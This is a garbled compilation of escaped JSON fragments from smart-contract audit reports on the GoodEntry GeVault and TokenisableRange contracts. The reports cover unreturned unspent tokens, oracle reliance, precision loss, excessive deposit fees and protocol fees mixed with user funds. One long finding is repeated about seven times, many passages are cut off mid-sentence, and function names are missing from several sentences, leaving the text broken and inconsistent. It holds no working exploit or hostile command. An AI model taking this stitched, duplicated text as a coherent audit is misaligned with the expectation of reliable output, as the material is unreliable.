There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

If the `nonReentrant` modifier is correctly implemented and used in all public/external functions where it's needed, it should prevent reentrancy attacks by disallowing multiple invocations of the functions at the same time. The presence of external calls means that the potential for reentrancy must be carefully considered and guarded against in all external or public functions that manage funds or modify critical state within the contract.

The report also indicates that similar precision loss in other calculations involving `vaultValueX8`, `totalSupply()`, `oracle.getAssetPrice(token)`, and fees subtraction could result in similar issues.

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

                "description": "The function `returnExpectedBalanceWithoutFees` fetches asset prices from an oracle to perform some calculations regarding liquidity amounts. The vulnerability lies in the fact that the smart contract relies on an external price oracle (`ORACLE.getAssetPrice`) without any apparent validation or safeguard against manipulation.\n\nPrice oracle manipulation occurs when an attacker can influence the price reported by the oracle. This could be done directly if the oracle has vulnerabilities or indirectly if the oracle sources prices from a market that the attacker can manipulate (like a low liquidity trading pair). By moving the price in their favor, an attacker could potentially cause the smart contract to perform actions that would benefit the attacker financially, at the expense of other users.\n\nThe contract assumes that the oracle price is accurate and trustworthy. However, in practice, oracles should be treated with caution as they represent a central point of failure. Smart contracts should include additional checks or fail-safes, such as using multiple oracles, a time-weighted average price, or additional circuit breaker mechanisms to reduce the risk of oracle manipulation.\n\nAdditionally, reliance on prices from an oracle introduces trust into what might otherwise be a trustless system. This is against the principle of decentralized finance (DeFi), which strives for trust minimization.\n\nMoreover, the code lacks error handling for when the oracle price is zero or unavailable, which could lead to division by zero or other unexpected behavior.\n\nTo enhance security, it's critical to apply best practices for oracle usage, like utilizing decentralized oracles, using multiple price feeds, implementing price-update thresholds, and adding circuit breakers or other emergency stop mechanisms.",

                "description": "To properly evaluate the smart contract code for vulnerabilities, we need to take into account the following aspects of the provided function: 1. External Oracle Call: The contract calls an external oracle to get the price of assets (TOKEN0 and TOKEN1) if the provided prices are zero. While this itself is not necessarily a vulnerability, it introduces external dependencies and trust requirements. Care must be taken to ensure the oracle is reputable and resistant to manipulation, but a vulnerability can't be assessed on this information alone. 2. Price Calculation Logic: The function calculates a price ratio and uses it to derive quantities (amt0, amt1) based on liquidity and tick information. The mathematical operations are performed with careful attention to the order of operations to prevent integer overflows or underflows. 3. Decimal Handling and Type Conversions: There is handling for different token decimals, which suggests an understanding of the need to normalize token amounts when dealing with different decimal places. Also, the use of uint160 to typecast the square root result suggests type conversions are being considered. However, without more context, it is not possible to determine if this typecasting is correct or if it could introduce a vulnerability. 4. Use of Unverified External Contracts: The contract seems to rely on external contracts (ORACLE and LiquidityAmounts) and libraries (TickMath) for obtaining asset prices and liquidity amounts. If these external components are not verified and audited, they could introduce vulnerabilities into the system. 5. Immutable Constants and Storage Access: The constants TOKEN0 and TOKEN1, the external ORACLE, and the global variables lowerTick, upperTick, and liquidity are not provided within the given code snippet. Therefore, we cannot assess if they are properly initialized or if they present an immutable state where appropriate. 6. Function Visibility and Access Control: Since the function is marked internal, it should only be callable from within the contract or its derived contracts. We cannot determine from the snippet if there are proper access controls or if the calling context would ensure integrity for the inputs and system invariants. Based on the given code snippet alone, and without additional context of the entire smart contract, specific contract state, and environment, it is impossible to assert definitively if there's a vulnerability. The snippet does not present explicit traditional vulnerabilities like reentrancy, unchecked external calls, or overflow/underflow without considering the broader contract context. To conclude, the code requires a broader view of the overall contract and its associated components, as well as an understanding of operational assumptions, to effectively evaluate for vulnerabilities.

The division can result in zero if `oracleData.token1Price` is greater than `oracleData.token0Price` multiplied by `10**18`. This can occur because different tokens can have vastly different values, which is not uncommon in the ERC20 space.\n\nThe division by `oracleData.token1Price` before multiplying by `2**96` can cause a rounding to zero if `oracleData.token1Price` is significantly higher in value. This would result in `sqrtPriceX96` being zero when in reality it should have a non-zero value.\n\nThe knock-on effect of this is significant, as demonstrated by the `getAmountsForLiquidity` function. A zero value for `sqrtPriceX96` would cause `getAmountsForLiquidity` to always calculate `amount0` only, incorrectly calculating the liquidity value. Ultimately, this can lead to a severe underestimation of the actual liquidity value, which in turn could trigger unwarranted liquidations, as described in the report.\n\nThe suggested solution in the report is to multiply by `2**96` before performing the division operation, ensuring that the product is a large integer before division and, thus, avoiding the division rounding down to zero.\n\nThe code provided in the question manipulates the sequence of the mathematical operations to mitigate this risk by performing multiplication by `2**192` before the division and before adjusting for decimals. This change ensures that the multiplication increases the magnitude of the numerator sufficiently to prevent the division result from being rounded to zero due to the high relative value of `oracleData.token1Price`.\n\nIn conclusion, the original code as described in the vulnerability report is indeed vulnerable due to an underflow issue during price calculation, but the proposed `returnExpectedBalanceWithoutFees` code snippet includes a corrected calculation that should prevent this issue.",

The getThisPositionTicks function used by rerange and doRebalance functions does not distinguish between protocol fees and user funds since it fetches the entire balance of the contract for token0 and token1, rather than the balance excluding protocol fees. As a result, protocol fees get entangled with user funds, leading to an incorrect and inflated liquidity provision. This issue would result in the collectProtocolFees function failing to work properly, as it expects to withdraw an amount of tokens that considers the protocol fees, but those fees may have been added to the liquidity pool and are no longer available in the contract's balance. This logic flaw necessitates changes to prevent commingling of user funds with protocol fees and to ensure correct accounting and collection of protocol fees.",

                    "description": "The vulnerability is due to the potential loss of precision resulting from the division of integer values before a subsequent multiplication. The code snippet provided details how price values are manipulated to determine a ratio representing the pegged relationship between two assets. The specific vulnerability lies in the `latestRoundData()` function of the `PegOracle` contract. It first multiplies the lesser price (`price1` or `price2`) by 10,000 (`1e4`) and then divides it by the greater price. Later, it attempts to scale this to 18 decimal places to standardize the price ratios by multiplying with `10 ** (18 - priceFeed1.decimals())`. Finally, this result is divided by 1 million (`1e6`). This order of operations causes a loss of precision which is significant since these divisions and multiplications are performed on integers, and Solidity does not handle fractions, leading to truncation of decimals at every division step. To address the vulnerability, price normalization (scaling to 18 decimals) should occur before any division to minimize the loss of precision. The `latestRoundData2()` provided in the Proof of Concept looks to improve upon the original code by first scaling the prices (`price1` and `price2`) to 18 decimals using the `scalePriceTo18()` function and then performing the division. The `scalePriceTo18()` function in the given code correctly accounts for the decimal differences of the assets when representing prices with 18 decimals. The ratio is computed as `price1 * 1e18 / price2` after both prices have been scaled. This method vastly reduces precision loss since it avoids dividing a potentially much smaller number by a larger one prematurely. The mitigation step recommended - using `x * 1e18 / y` - is a better approach. It ensures that the resulting ratio respects the decimal differences between the assets and provides a more accurate value that can be reliably compared to other values with 18 decimal places.",

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

Chainlink price feeds can have different numbers of decimals, typically 8 or 18, but the provided code snippet only works correctly when the price feed has 8 decimals. The erroneous calculation will lead to incorrect data when the decimals are different.\n\nIn the original reported calculation, which is not part of the provided `getValuePerLPAtPrice` function, the math adds or removes decimals incorrectly, leading to results that are off by several orders of magnitude.\n\nBased on the recommendation in the report, correcting this would involve keeping the result in the same decimal precision as the input price feeds, thus avoiding unnecessary and potentially inaccurate scaling up and down to the 18-decimal format. The corrected math ensures the final result carries the number of decimals equal to the original price feed's decimals (represented by `d` in the report).\n\nIn summary, the provided `getValuePerLPAtPrice` function itself does not directly contain the vulnerability mentioned in the report. However, it does rely on accurate price feeds, and should those prices be calculated as described in the vulnerability report, the `getValuePerLPAtPrice` function would be working with inaccurate data, which could indirectly affect its output. Therefore, the contract contains a vulnerability regarding arithmetic calculations with decimal places, but it is in a different part of the code related to handling price feed decimals.",

However, if price moves outside the range during the transaction, user will be charged an excessive fee.\n\n## Proof of Concept\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nSuppose range is [120, 122] and current price is 121. Alice calls `deposit` with `{n0: 100, n1:100} `, if Price moves to 119 during execution (due to market fluctuations or malicious frontrunning), `getAmountsForLiquidity` will return 0 for `token1Amount`. As a result, `newFee1` will be equal to `n1`, which means all the 100 token1 will be charged as fee.\n\n    (uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n      INonfungiblePositionManager.IncreaseLiquidityParams({\n        tokenId: tokenId,\n        amount0Desired: n0,\n        amount1Desired: n1,\n        amount0Min: n0 * 95 / 100,\n        amount1Min: n1 * 95 / 100,\n        deadline: block.timestamp\n      })\n    );\n\nThen, `increaseLiquidity` will succeed since `amount1Min` is now zero.\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nDon't use this to calculate fee:\n\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nAlways use this:\n\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n\n\n## Assessed type\n\nContext"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

These functions use the contract's entire token balance, which may include protocol fees, for adding liquidity. The `getThisPositionTicks()` function does not differentiate between user funds and protocol fees before performing actions, leading to the possible misuse of protocol funds. A malicious actor could exploit this by causing the contract to incorporate protocol fees into liquidity operations and then attempting to collect these fees, which would likely result in an error due to insufficient funds. To patch this vulnerability, proper accounting should be implemented to separate user funds and protocol fees, possibly by storing protocol fees in a separate contract.",

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

